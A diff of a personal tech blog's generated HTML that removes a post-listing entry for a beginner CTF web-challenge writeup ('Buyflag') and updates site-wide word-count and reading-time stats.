-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2019-11-25 20:29:01" itemprop="dateCreated datePublished" datetime="2019-11-25T20:29:01+08:00">2019-11-25</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2019-12-10 20:15:12" itemprop="dateModified" datetime="2019-12-10T20:15:12+08:00">2019-12-10</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
-        </span>
-    </span>
-
-  
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2019/11/25/BUUOJ%E5%88%B7%E9%A2%98-Web-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Buyflag/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2019/11/25/BUUOJ%E5%88%B7%E9%A2%98-Web-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Buyflag/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>692</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>Syclover极客大挑战的一道题，挺简单的。 上来让我们买Flag。抓一下包，很明显的看到Cookie里有个user=0，我们直接改成1，然后要password，页面后面有一段注释。
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2019/11/25/BUUOJ%E5%88%B7%E9%A2%98-Web-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Buyflag/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1525,14 +1544,14 @@ B--&gt;|Prototype|C[&quot;123&quot;]
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">320k</span>
+    <span title="站点总字数">323k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">4:51</span>
+    <span title="站点阅读时长">4:54</span>
   </span>
 </div>
 <div class="busuanzi-count">
